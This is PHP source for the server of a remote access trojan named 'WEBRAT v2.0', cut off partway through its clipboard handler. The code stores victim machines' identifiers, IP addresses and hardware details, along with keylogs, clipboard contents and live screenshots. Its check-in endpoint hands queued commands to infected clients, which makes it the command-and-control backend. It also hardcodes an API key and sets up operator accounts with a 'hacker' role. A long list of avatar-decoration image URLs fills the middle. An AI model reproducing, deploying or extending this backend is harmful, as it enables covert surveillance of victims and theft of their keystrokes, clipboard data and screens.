<?php
// =============================================================
//  WEBRAT v2.0 - API Endpoint (Auto-Database Migration)
// =============================================================

// Start session early so $_SESSION is available everywhere
session_start();

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Api-Key');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

require_once __DIR__ . '/db.php';

define('CLIENT_API_KEY', 'WEBRAT_SECRET_KEY_2026');

function jsonOk($data = [], $msg = 'OK') {
    echo json_encode(['status' => 'ok', 'message' => $msg, 'data' => $data], JSON_UNESCAPED_UNICODE);
    exit;
}
function jsonErr($msg = 'Error', $code = 400) {
    http_response_code($code);
    echo json_encode(['status' => 'error', 'message' => $msg], JSON_UNESCAPED_UNICODE);
    exit;
}
function requireApiKey() {
    $key = $_SERVER['HTTP_X_API_KEY'] ?? $_GET['key'] ?? $_POST['key'] ?? '';
    if ($key !== CLIENT_API_KEY) {
        jsonErr('INVALID_API_KEY', 403);
    }
}
function requireDashboardAuth() {
    if (!isset($_SESSION['webrat_user'])) {
        jsonErr('NOT_AUTHENTICATED', 401);
    }
}
function getJsonBody(): array {
    $raw = file_get_contents('php://input');
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}
// Role helper: 0=member, 1=admin, 2=hacker, 3=manager
function getRoleName(int $code): string {
    switch ($code) {
        case 1: return 'admin';
        case 2: return 'hacker';
        case 3: return 'manager';
        default: return 'member';
    }
}

function timeAgo($datetime) {
    if (!$datetime) return 'never';
    $now = new DateTime();
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);
    if ($diff->days > 0) return $diff->days . ' day(s) ago';
    if ($diff->h > 0)    return 'about ' . $diff->h . ' hour(s) ago';
    if ($diff->i > 0)    return $diff->i . ' minute(s) ago';
    return 'less than a minute ago';
}

function autoMigrateTables(PDO $db) {
    try {
        $db->exec("CREATE TABLE IF NOT EXISTS `clients` (
          `id` INT AUTO_INCREMENT PRIMARY KEY,
          `client_id` VARCHAR(20) NOT NULL UNIQUE,
          `hwid` VARCHAR(64) DEFAULT '',
          `loc` VARCHAR(10) DEFAULT '',
          `username` VARCHAR(255) DEFAULT '',
          `pcname` VARCHAR(100) DEFAULT '',
          `ip` VARCHAR(45) DEFAULT '',
          `status` ENUM('online','recent','away') DEFAULT 'away',
          `active_window` VARCHAR(255) DEFAULT '',
          `asn` VARCHAR(100) DEFAULT '',
          `hosting` TINYINT(1) DEFAULT 0,
          `system_info` VARCHAR(255) DEFAULT '',
          `last_active` DATETIME DEFAULT NULL,
          `debut` DATETIME DEFAULT NULL,
          `admin_rights` TINYINT(1) DEFAULT 0,
          `cpu` VARCHAR(150) DEFAULT '',
          `gpu` VARCHAR(150) DEFAULT '',
          `ram` VARCHAR(50) DEFAULT '',
          `disk` VARCHAR(100) DEFAULT '',
          `online_hours` INT DEFAULT 0,
          `total_hours` INT DEFAULT 0,
          `last_ping` DATETIME DEFAULT NULL,
          `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
          `updated_at` DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

        // Add hwid column if it doesn't exist yet (for existing tables)
        try {
            $db->exec("ALTER TABLE `clients` ADD COLUMN `hwid` VARCHAR(64) DEFAULT '' AFTER `client_id`");
        } catch (Exception $e) {
            // Column already exists, ignore
        }

        $db->exec("CREATE TABLE IF NOT EXISTS `keylogs` (
          `id` INT AUTO_INCREMENT PRIMARY KEY,
          `client_id` VARCHAR(20) NOT NULL,
          `window_name` VARCHAR(255) DEFAULT '',
          `text` TEXT,
          `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

        $db->exec("CREATE TABLE IF NOT EXISTS `clipboards` (
          `id` INT AUTO_INCREMENT PRIMARY KEY,
          `client_id` VARCHAR(20) NOT NULL,
          `text` TEXT,
          `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

        // Bang luu anh chup man hinh live (1 anh moi nhat / client)
        $db->exec("CREATE TABLE IF NOT EXISTS `screenshots_live` (
          `id`          INT AUTO_INCREMENT PRIMARY KEY,
          `client_id`   VARCHAR(20) NOT NULL,
          `hwid`        VARCHAR(64) DEFAULT '',
          `image_b64`   MEDIUMTEXT,
          `width`       SMALLINT DEFAULT 0,
          `height`      SMALLINT DEFAULT 0,
          `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
          UNIQUE KEY uniq_client (`client_id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

        $db->exec("CREATE TABLE IF NOT EXISTS `admin_chat` (
          `id`      INT AUTO_INCREMENT PRIMARY KEY,
          `sender`  VARCHAR(255) NOT NULL,
          `message` TEXT NOT NULL,
          `type`    VARCHAR(10) NOT NULL DEFAULT 'text',
          `media`   MEDIUMTEXT DEFAULT NULL,
          `sent_at` DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

        // Bang quan ly tai khoan admin / profile
        // admin_rights: 0=member, 1=admin, 2=hacker, 3=manager
        $db->exec("CREATE TABLE IF NOT EXISTS `accounts` (
          `id` INT AUTO_INCREMENT PRIMARY KEY,
          `username` VARCHAR(50) NOT NULL UNIQUE,
          `password_hash` VARCHAR(255) NOT NULL,
          `nickname` VARCHAR(30) DEFAULT NULL,
          `avatar` LONGTEXT DEFAULT NULL,
          `bio` VARCHAR(300) DEFAULT NULL,
          `cover` LONGTEXT DEFAULT NULL,
          `is_active` TINYINT(1) DEFAULT 1,
          `last_login` DATETIME DEFAULT NULL,
          `last_seen` DATETIME DEFAULT NULL,
          `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

        // Add type/media columns to existing tables
        try { $db->exec("ALTER TABLE `admin_chat` ADD COLUMN `type` VARCHAR(10) NOT NULL DEFAULT 'text' AFTER `message`"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `admin_chat` ADD COLUMN `media` MEDIUMTEXT DEFAULT NULL AFTER `type`"); } catch (Exception $e) {}

        // Add profile columns to accounts if not exist & optimize for high-resolution Base64 / GIF images
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `nickname` VARCHAR(30) DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `avatar` LONGTEXT DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `bio` VARCHAR(300) DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `cover` LONGTEXT DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `last_seen` DATETIME DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `admin_rights` TINYINT(4) DEFAULT 0 COMMENT '0=member,1=admin,2=hacker,3=manager'"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `profile_color_top` VARCHAR(7) DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `profile_color_bottom` VARCHAR(7) DEFAULT NULL"); } catch (Exception $e) {}
        // Avatar decoration GIF URL + settings (JSON: {size, x, y})
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `avatar_deco_url` VARCHAR(500) DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD COLUMN `avatar_deco_settings` VARCHAR(200) DEFAULT NULL"); } catch (Exception $e) {}

        // Decoration presets catalog
        $db->exec("CREATE TABLE IF NOT EXISTS `deco_presets` (
          `id`         INT AUTO_INCREMENT PRIMARY KEY,
          `name`       VARCHAR(100) NOT NULL,
          `url`        VARCHAR(500) NOT NULL DEFAULT '',
          `sort_order` INT DEFAULT 0,
          `is_active`  TINYINT(1) DEFAULT 1,
          `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

        // Seed default presets (INSERT IGNORE avoids duplicates on re-run)
        $db->exec("INSERT IGNORE INTO `deco_presets` (`id`,`name`,`url`,`sort_order`) VALUES
          (1, 'Sakura',     'https://cdn.discordapp.com/avatar-decoration-presets/a_d2bf761ee4331af2b64ff9294ecf229f.png?size=4096&passthrough=true', 1),
          (2, 'Gold Wings', 'https://cdn.discordapp.com/avatar-decoration-presets/a_fe187e3369c4f3c37774b06df6a6b684.png?size=4096&passthrough=true', 2)
        ");
        // Seed avatardecoration.com preset library (165 entries)
        $db->exec("INSERT IGNORE INTO `deco_presets` (`id`,`name`,`url`,`sort_order`) VALUES
          (3,   'A Hint Of Clove',        'https://img.avatardecoration.com/decorations/a_hint_of_clove.png',        3),
          (4,   'Air',                    'https://img.avatardecoration.com/decorations/air.png',                    4),
          (5,   'Akuma',                  'https://img.avatardecoration.com/decorations/akuma.png',                  5),
          (6,   'Angry',                  'https://img.avatardecoration.com/decorations/angry.png',                  6),
          (7,   'Arcane Sigil',           'https://img.avatardecoration.com/decorations/arcane_sigil.png',           7),
          (8,   'Astronaut Helmet',       'https://img.avatardecoration.com/decorations/astronaut_helmet.png',       8),
          (9,   'Aurora',                 'https://img.avatardecoration.com/decorations/aurora.png',                 9),
          (10,  'Autumn Crown',           'https://img.avatardecoration.com/decorations/autumn_crown.png',           10),
          (11,  'Autumns Arbor',          'https://img.avatardecoration.com/decorations/autumns_arbor.png',          11),
          (12,  'Autumns Arbor Aurora',   'https://img.avatardecoration.com/decorations/autumns_arbor_aurora.png',   12),
          (13,  'Baby Displacer Beast',   'https://img.avatardecoration.com/decorations/baby_displacer_beast.png',   13),
          (14,  'Balance',                'https://img.avatardecoration.com/decorations/balance.png',                14),
          (15,  'Batarang',               'https://img.avatardecoration.com/decorations/batarang.png',               15),
          (16,  'Beamchop',               'https://img.avatardecoration.com/decorations/beamchop.png',               16),
          (17,  'Black Hole',             'https://img.avatardecoration.com/decorations/black_hole.png',             17),
          (18,  'Blade Storm',            'https://img.avatardecoration.com/decorations/blade_storm.png',            18),
          (19,  'Blanket Green',          'https://img.avatardecoration.com/decorations/blanket_green.png',          19),
          (20,  'Blanket Orange',         'https://img.avatardecoration.com/decorations/blanket_orange.png',         20),
          (21,  'Blanket Pink',           'https://img.avatardecoration.com/decorations/blanket_pink.png',           21),
          (22,  'Blanket Purple',         'https://img.avatardecoration.com/decorations/blanket_purple.png',         22),
          (23,  'Bloodthirsty',           'https://img.avatardecoration.com/decorations/bloodthirsty.png',           23),
          (24,  'Bloodthirsty Gold',      'https://img.avatardecoration.com/decorations/bloodthirsty_gold.png',      24),
          (25,  'Bloodthirsty Green',     'https://img.avatardecoration.com/decorations/bloodthirsty_green.png',     25),
          (26,  'Bloomling',              'https://img.avatardecoration.com/decorations/bloomling.png',              26),
          (27,  'Blue Futuristic UI',     'https://img.avatardecoration.com/decorations/blue_futuristic_ui.png',     27),
          (28,  'Blue Gyroscope',         'https://img.avatardecoration.com/decorations/blue_gyroscope.png',         28),
          (29,  'Blue Hyper Helmet',      'https://img.avatardecoration.com/decorations/blue_hyper_helmet.png',      29),
          (30,  'Blue Smoke',             'https://img.avatardecoration.com/decorations/blue_smoke.png',             30),
          (31,  'Blueberry Jam',          'https://img.avatardecoration.com/decorations/blueberry_jam.png',          31),
          (32,  'Bowler Hat',             'https://img.avatardecoration.com/decorations/bowler_hat.png',             32),
          (33,  'Box Blue Yellow',        'https://img.avatardecoration.com/decorations/box_blue_yellow.png',        33),
          (34,  'Box Green Red',          'https://img.avatardecoration.com/decorations/box_green_red.png',          34),
          (35,  'Box Red White',          'https://img.avatardecoration.com/decorations/box_red_white.png',          35),
          (36,  'Box Red White Blue',     'https://img.avatardecoration.com/decorations/box_red_white_blue.png',     36),
          (37,  'Box White Blue',         'https://img.avatardecoration.com/decorations/box_white_blue.png',         37),
          (38,  'Brass Beats',            'https://img.avatardecoration.com/decorations/brass_beats.png',            38),
          (39,  'Bubble Tea',             'https://img.avatardecoration.com/decorations/bubble_tea.png',             39),
          (40,  'Bunny',                  'https://img.avatardecoration.com/decorations/bunny.png',                  40),
          (41,  'Bunny Zzzs',             'https://img.avatardecoration.com/decorations/bunny_zzzs.png',             41),
          (42,  'Burnt Toast',            'https://img.avatardecoration.com/decorations/burnt_toast.png',            42),
          (43,  'Bush Camper',            'https://img.avatardecoration.com/decorations/bush_camper.png',            43),
          (44,  'Butterflies',            'https://img.avatardecoration.com/decorations/butterflies.png',            44),
          (45,  'Cammy',                  'https://img.avatardecoration.com/decorations/cammy.png',                  45),
          (46,  'Candlelight',            'https://img.avatardecoration.com/decorations/candlelight.png',            46),
          (47,  'Candlelight Crimson',    'https://img.avatardecoration.com/decorations/candlelight_crimson.png',    47),
          (48,  'Candlelight Dark',       'https://img.avatardecoration.com/decorations/candlelight_dark.png',       48),
          (49,  'Cannon Fire',            'https://img.avatardecoration.com/decorations/cannon_fire.png',            49),
          (50,  'Cat 1',                  'https://img.avatardecoration.com/decorations/cat_1.png',                  50),
          (51,  'Cat 2',                  'https://img.avatardecoration.com/decorations/cat_2.png',                  51),
          (52,  'Cat 3',                  'https://img.avatardecoration.com/decorations/cat_3.png',                  52),
          (53,  'Cat 4',                  'https://img.avatardecoration.com/decorations/cat_4.png',                  53),
          (54,  'Cat Ear Headset',        'https://img.avatardecoration.com/decorations/cat_ear_headset.png',        54),
          (55,  'Cat Ears',               'https://img.avatardecoration.com/decorations/cat_ears.png',               55),
          (56,  'Cattiva',                'https://img.avatardecoration.com/decorations/cattiva.png',                56),
          (57,  'Chewbert',               'https://img.avatardecoration.com/decorations/chewbert.png',               57),
          (58,  'Chillet',                'https://img.avatardecoration.com/decorations/chillet.png',                58),
          (59,  'Chromawave',             'https://img.avatardecoration.com/decorations/chromawave.png',             59),
          (60,  'Chrysanthemums Morning', 'https://img.avatardecoration.com/decorations/chrysanthemums_morning.png', 60),
          (61,  'Chrysanthemums Twilight','https://img.avatardecoration.com/decorations/chrysanthemums_twilight.png',61),
          (62,  'Chuck',                  'https://img.avatardecoration.com/decorations/chuck.png',                  62),
          (63,  'Chun Li',                'https://img.avatardecoration.com/decorations/chun_li.png',                63),
          (64,  'Clyde Invaders',         'https://img.avatardecoration.com/decorations/clyde_invaders.png',         64),
          (65,  'Confetti Festive',       'https://img.avatardecoration.com/decorations/confetti_festive.png',       65),
          (66,  'Confetti Fire',          'https://img.avatardecoration.com/decorations/confetti_fire.png',          66),
          (67,  'Confetti Mint',          'https://img.avatardecoration.com/decorations/confetti_mint.png',          67),
          (68,  'Confetti Ice',           'https://img.avatardecoration.com/decorations/confetti_ice.png',           68),
          (69,  'Confetti Star',          'https://img.avatardecoration.com/decorations/confetti_star.png',          69),
          (70,  'Confetti Vaporwave',     'https://img.avatardecoration.com/decorations/confetti_vaporwave.png',     70),
          (71,  'Constellations',         'https://img.avatardecoration.com/decorations/constellations.png',         71),
          (72,  'Cottage Home',           'https://img.avatardecoration.com/decorations/cottage_home.png',           72),
          (73,  'Cozy Cat',               'https://img.avatardecoration.com/decorations/cozy_cat.png',               73),
          (74,  'Cozy Headphones',        'https://img.avatardecoration.com/decorations/cozy_headphones.png',        74),
          (75,  'Cozy Post It',           'https://img.avatardecoration.com/decorations/cozy_post_it.png',           75),
          (76,  'Cozy Post It Festive',   'https://img.avatardecoration.com/decorations/cozy_post_it_festive.png',   76),
          (77,  'Crossbones',             'https://img.avatardecoration.com/decorations/crossbones.png',             77),
          (78,  'Crystal Ball Blue',      'https://img.avatardecoration.com/decorations/crystal_ball_blue.png',      78),
          (79,  'Crystal Ball Purple',    'https://img.avatardecoration.com/decorations/crystal_ball_purple.png',    79),
          (80,  'Crystal Elk',            'https://img.avatardecoration.com/decorations/crystal_elk.png',            80),
          (81,  'Cybernetic',             'https://img.avatardecoration.com/decorations/cybernetic.png',             81),
          (82,  'Cypher Neural Theft',    'https://img.avatardecoration.com/decorations/cypher_neural_theft.png',    82),
          (83,  'Dancing Fairies',        'https://img.avatardecoration.com/decorations/dancing_fairies.png',        83),
          (84,  'Dandelion Duo',          'https://img.avatardecoration.com/decorations/dandelion_duo.png',          84),
          (85,  'Deaths Edge',            'https://img.avatardecoration.com/decorations/deaths_edge.png',            85),
          (86,  'Depresso',               'https://img.avatardecoration.com/decorations/depresso.png',               86),
          (87,  'Defensive Shield',       'https://img.avatardecoration.com/decorations/defensive_shield.png',       87),
          (88,  'Dice Azure',             'https://img.avatardecoration.com/decorations/dice_azure.png',             88),
          (89,  'Dice Violet',            'https://img.avatardecoration.com/decorations/dice_violet.png',            89),
          (90,  'Digital Sunrise',        'https://img.avatardecoration.com/decorations/digital_sunrise.png',        90),
          (91,  'Dismay',                 'https://img.avatardecoration.com/decorations/dismay.png',                 91),
          (92,  'Donut',                  'https://img.avatardecoration.com/decorations/donut.png',                  92),
          (93,  'Disxcore Headset',       'https://img.avatardecoration.com/decorations/disxcore_headset.png',       93),
          (94,  'Doodlezard',             'https://img.avatardecoration.com/decorations/doodlezard.png',             94),
          (95,  'Doodling',               'https://img.avatardecoration.com/decorations/doodling.png',               95),
          (96,  'Dragons Smile',          'https://img.avatardecoration.com/decorations/dragons_smile.png',          96),
          (97,  'Dusk And Dawn',          'https://img.avatardecoration.com/decorations/dusk_and_dawn.png',          97),
          (98,  'Earth',                  'https://img.avatardecoration.com/decorations/earth.png',                  98),
          (99,  'Eldritch Ring',          'https://img.avatardecoration.com/decorations/eldritch_ring.png',          99),
          (100, 'Faces Of The Moon',      'https://img.avatardecoration.com/decorations/faces_of_the_moon.png',      100),
          (101, 'Fairy Sprites',          'https://img.avatardecoration.com/decorations/fairy_sprites.png',          101),
          (102, 'Fairy Sprites Blue',     'https://img.avatardecoration.com/decorations/fairy_sprites_blue.png',     102),
          (103, 'Fairy Sprites Pink',     'https://img.avatardecoration.com/decorations/fairy_sprites_pink.png',     103),
          (104, 'Fall Leaves',            'https://img.avatardecoration.com/decorations/fall_leaves.png',            104),
          (105, 'Fall Leaves Scarlet',    'https://img.avatardecoration.com/decorations/fall_leaves_scarlet.png',    105),
          (106, 'Fall Leaves Woodland',   'https://img.avatardecoration.com/decorations/fall_leaves_woodland.png',   106),
          (107, 'Fan Flourish',           'https://img.avatardecoration.com/decorations/fan_flourish.png',           107),
          (108, 'Feelin Awe',             'https://img.avatardecoration.com/decorations/feelin_awe.png',             108),
          (109, 'Fire',                   'https://img.avatardecoration.com/decorations/fire.png',                   109),
          (110, 'Firecrackers',           'https://img.avatardecoration.com/decorations/firecrackers.png',           110),
          (111, 'Fishbones',              'https://img.avatardecoration.com/decorations/fishbones.png',              111),
          (112, 'Flame Chompers',         'https://img.avatardecoration.com/decorations/flame_chompers.png',         112),
          (113, 'Flaming Sword',          'https://img.avatardecoration.com/decorations/flaming_sword.png',          113),
          (114, 'Floral Harmony',         'https://img.avatardecoration.com/decorations/floral_harmony.png',         114),
          (115, 'Floral Harmony Sunburst','https://img.avatardecoration.com/decorations/floral_harmony_sunburst.png',115),
          (116, 'Flower Clouds',          'https://img.avatardecoration.com/decorations/flower_clouds.png',          116),
          (117, 'Flux Alchemy',           'https://img.avatardecoration.com/decorations/flux_alchemy.png',           117),
          (118, 'Forest',                 'https://img.avatardecoration.com/decorations/forest.png',                 118),
          (119, 'Fox Hat',                'https://img.avatardecoration.com/decorations/fox_hat.png',                119),
          (120, 'Frag Out',               'https://img.avatardecoration.com/decorations/frag_out.png',               120),
          (121, 'Freezer Bunny Lovebug',  'https://img.avatardecoration.com/decorations/freezer_bunny_lovebug.png',  121),
          (122, 'Fresh Pine',             'https://img.avatardecoration.com/decorations/fresh_pine.png',             122),
          (123, 'Fresh Pine Cinnamon',    'https://img.avatardecoration.com/decorations/fresh_pine_cinnamon.png',    123),
          (124, 'Fresh Pine Ribbon',      'https://img.avatardecoration.com/decorations/fresh_pine_ribbon.png',      124),
          (125, 'Fried Egg',              'https://img.avatardecoration.com/decorations/fried_egg.png',              125),
          (126, 'Frog 1',                 'https://img.avatardecoration.com/decorations/frog_1.png',                 126),
          (127, 'Frog Hat',               'https://img.avatardecoration.com/decorations/frog_hat.png',               127),
          (128, 'Fuchsia Agent',          'https://img.avatardecoration.com/decorations/fuchsia_agent.png',          128),
          (129, 'Glowing Runes',          'https://img.avatardecoration.com/decorations/glowing_runes.png',          129),
          (130, 'Goblin Stinkums',        'https://img.avatardecoration.com/decorations/goblin_stinkums.png',        130),
          (131, 'Good Ol Pepper',         'https://img.avatardecoration.com/decorations/good_ol_pepper.png',         131),
          (132, 'Graveyard Cat',          'https://img.avatardecoration.com/decorations/graveyard_cat.png',          132),
          (133, 'Green Futuristic UI',    'https://img.avatardecoration.com/decorations/green_futuristic_ui.png',    133),
          (134, 'Green Gyroscope',        'https://img.avatardecoration.com/decorations/green_gyroscope.png',        134),
          (135, 'Green Smoke',            'https://img.avatardecoration.com/decorations/green_smoke.png',            135),
          (136, 'Group Hug',              'https://img.avatardecoration.com/decorations/group_hug.png',              136),
          (137, 'Guile',                  'https://img.avatardecoration.com/decorations/guile.png',                  137),
          (138, 'Heartbloom',             'https://img.avatardecoration.com/decorations/heartbloom.png',             138),
          (139, 'Helmsman',               'https://img.avatardecoration.com/decorations/helmsman.png',               139),
          (140, 'Hex Lights',             'https://img.avatardecoration.com/decorations/hex_lights.png',             140),
          (141, 'Hood Crimson',           'https://img.avatardecoration.com/decorations/hood_crimson.png',           141),
          (142, 'Icicle Gleaming',        'https://img.avatardecoration.com/decorations/icicle_gleaming.png',        142),
          (143, 'Im A Clown',             'https://img.avatardecoration.com/decorations/im_a_clown.png',             143),
          (144, 'Imagination',            'https://img.avatardecoration.com/decorations/imagination.png',            144),
          (145, 'Implant',                'https://img.avatardecoration.com/decorations/implant.png',                145),
          (146, 'In Love',                'https://img.avatardecoration.com/decorations/in_love.png',                146),
          (147, 'In Tears',               'https://img.avatardecoration.com/decorations/in_tears.png',               147),
          (148, 'Jack O Lantern',         'https://img.avatardecoration.com/decorations/jack_o_lantern.png',         148),
          (149, 'Jeff The Land Shark',    'https://img.avatardecoration.com/decorations/jeff_the_land_shark.png',    149),
          (150, 'Joystick',               'https://img.avatardecoration.com/decorations/joystick.png',               150),
          (151, 'Ki Energy',              'https://img.avatardecoration.com/decorations/ki_energy.png',               151),
          (152, 'Koi Pond',               'https://img.avatardecoration.com/decorations/koi_pond.png',               152),
          (153, 'Lamball',                'https://img.avatardecoration.com/decorations/lamball.png',                153),
          (154, 'Lightning',              'https://img.avatardecoration.com/decorations/lightning.png',              154),
          (155, 'Lofi Girl Outfit',       'https://img.avatardecoration.com/decorations/lofi_girl_outfit.png',       155),
          (156, 'Lucky Envelopes',        'https://img.avatardecoration.com/decorations/lucky_envelopes.png',        156),
          (157, 'Lunar Lanterns',         'https://img.avatardecoration.com/decorations/lunar_lanterns.png',         157),
          (158, 'Magic Portal Blue',      'https://img.avatardecoration.com/decorations/magic_portal_blue.png',      158),
          (159, 'Magic Portal Purple',    'https://img.avatardecoration.com/decorations/magic_portal_purple.png',    159),
          (160, 'Magical Potion',         'https://img.avatardecoration.com/decorations/magical_potion.png',         160),
          (161, 'Magical Wand Green',     'https://img.avatardecoration.com/decorations/magical_wand_green.png',     161),
          (162, 'Mech Flora',             'https://img.avatardecoration.com/decorations/mech_flora.png',             162),
          (163, 'Los Santos',             'https://img.avatardecoration.com/decorations/los_santos.png',             163),
          (164, 'Pancakes',               'https://img.avatardecoration.com/decorations/pancakes.png',               164),
          (165, 'Pink Futuristic UI',     'https://img.avatardecoration.com/decorations/pink_futuristic_ui.png',     165),
          (166, 'Playful Lofi Cat',       'https://img.avatardecoration.com/decorations/playful_lofi_cat.png',       166),
          (167, 'Sakura Ink',             'https://img.avatardecoration.com/decorations/sakura_ink.png',             167)
        ");
        // Migrate admin_rights column from TINYINT(1) to TINYINT(4) to support 4 roles
        try { $db->exec("ALTER TABLE `accounts` MODIFY COLUMN `admin_rights` TINYINT(4) DEFAULT 0 COMMENT '0=member,1=admin,2=hacker,3=manager'"); } catch (Exception $e) {}

        // Ensure avatar & cover are LONGTEXT to support high-resolution base64 images & GIFs
        try { $db->exec("ALTER TABLE `accounts` MODIFY COLUMN `avatar` LONGTEXT DEFAULT NULL"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` MODIFY COLUMN `cover` LONGTEXT DEFAULT NULL"); } catch (Exception $e) {}

        // Add indexes for high-speed retrieval of chat messages & accounts
        try { $db->exec("ALTER TABLE `admin_chat` ADD INDEX `idx_sent_at` (`sent_at` ASC)"); } catch (Exception $e) {}
        try { $db->exec("ALTER TABLE `accounts` ADD INDEX `idx_username_active` (`username`, `is_active`)"); } catch (Exception $e) {}
    } catch (Exception $e) {}

    // Role assignments — run OUTSIDE the main try-catch so they always execute
    // even if an earlier CREATE/ALTER fails. 0=member, 1=admin, 2=hacker, 3=manager
    try { $db->exec("UPDATE `accounts` SET `admin_rights` = 1 WHERE LOWER(`username`) IN ('segaming', 'admin') AND `admin_rights` != 1"); } catch (Exception $e) {}
    try { $db->exec("UPDATE `accounts` SET `admin_rights` = 2 WHERE LOWER(`username`) = 'trananhkhoa'"); } catch (Exception $e) {}
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';
if ($action === '') {
    $rawInput = file_get_contents('php://input');
    $jsonInput = json_decode($rawInput, true);
    if (is_array($jsonInput) && !empty($jsonInput['action'])) {
        $action = trim($jsonInput['action']);
    }
}

try {
    // Phân luồng CSDL chuẩn:
    // - Tất cả tính năng profile.php & chat.php (admin_chat, accounts) dùng Database 2 (ctpzfsyl_Khoaxhoang)
    // - Tất cả tính năng hệ thống [clients], [clipboards], [commands], [screenshots], [keylogs] lưu ở Database 1 (taklcfgs_Hoangcha)
    $db2Actions = [
        'get_chat', 'send_chat', 'upload_chat_file', 'chat_user_list', 'clear_chat',
        'change_password', 'change_profile_bg', 'update_profile_avatar', 'get_profile_data',
        'check_user_online', 'update_online_status',
        'get_user_profile', 'get_profile', 'save_profile', 'ping',
        'get_deco_presets', 'add_deco_preset', 'delete_deco_preset'
    ];

    if (in_array($action, $db2Actions, true)) {
        $db = getDB2();
    } else {
        $db = getDB();
    }
    autoMigrateTables($db);
} catch (Exception $e) {
    jsonErr('DATABASE_CONNECTION_FAILED: ' . $e->getMessage(), 500);
}

// last_seen is ONLY updated inside get_chat and send_chat (active chat actions)
// so that "online" means the user is actively in the chat right now.

switch ($action) {
    case 'checkin':
        requireApiKey();
        $data = getJsonBody();
        $clientId = trim($data['client_id'] ?? '');
        if ($clientId === '') jsonErr('MISSING_CLIENT_ID');

        $fields = [
            'hwid'          => $data['hwid'] ?? '',
            'loc'           => $data['loc'] ?? '',
            'username'      => $data['username'] ?? '',
            'pcname'        => $data['pcname'] ?? '',
            'ip'            => $_SERVER['REMOTE_ADDR'] ?? ($data['ip'] ?? ''),
            'active_window' => $data['active_window'] ?? '',
            'asn'           => $data['asn'] ?? '',
            'hosting'       => (int)($data['hosting'] ?? 0),
            'system_info'   => $data['system_info'] ?? '',
            'admin_rights'  => (int)($data['admin_rights'] ?? 0),
            'cpu'           => $data['cpu'] ?? '',
            'gpu'           => $data['gpu'] ?? '',
            'ram'           => $data['ram'] ?? '',
            'disk'          => $data['disk'] ?? '',
            'online_hours'  => (int)($data['online_hours'] ?? 0),
            'total_hours'   => (int)($data['total_hours'] ?? 0),
            'last_ping'     => date('Y-m-d H:i:s'),
        ];

        try {
            $stmt = $db->prepare('SELECT id FROM clients WHERE client_id = ? LIMIT 1');
            $stmt->execute([$clientId]);
            $exists = $stmt->fetch();

            if ($exists) {
                $sets = []; $vals = [];
                foreach ($fields as $col => $val) { $sets[] = "`$col` = ?"; $vals[] = $val; }
                $sets[] = "`last_active` = NOW()";
                $sets[] = "`status` = 'online'";
                $vals[] = $clientId;
                $sql = 'UPDATE clients SET ' . implode(', ', $sets) . ' WHERE client_id = ?';
                $db->prepare($sql)->execute($vals);
            } else {
                $fields['client_id']   = $clientId;
                $fields['debut']       = date('Y-m-d H:i:s');
                $fields['last_active'] = date('Y-m-d H:i:s');
                $fields['status']      = 'online';

                $cols = array_keys($fields);
                $placeholders = array_fill(0, count($cols), '?');
                $sql = 'INSERT INTO clients (`' . implode('`,`', $cols) . '`) VALUES (' . implode(',', $placeholders) . ')';
                $db->prepare($sql)->execute(array_values($fields));
            }

            $cleanClientId = ltrim($clientId, '#');
            $cmdStmt = $db->prepare('SELECT id, command FROM commands WHERE (client_id = ? OR client_id = ? OR client_id = ?) AND status = ? ORDER BY created_at ASC LIMIT 5');
            $cmdStmt->execute([$clientId, $cleanClientId, '#' . $cleanClientId, 'pending']);
            $pendingCmds = $cmdStmt->fetchAll(PDO::FETCH_ASSOC);

            jsonOk(['pending_commands' => $pendingCmds], 'CHECKIN_OK');
        } catch (Exception $e) {
            jsonErr('CHECKIN_DB_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'clipboard':
        requireApiKey();
        $data = getJsonBody();
        $clientId = trim($data['client_id'] ?? '');
        if ($clientId === '') jsonErr('MISSING_CLIENT_ID');
        $text = trim($data['text'] ?? '');
        if ($text === '') jsonErr('NO_TEXT');

        try {
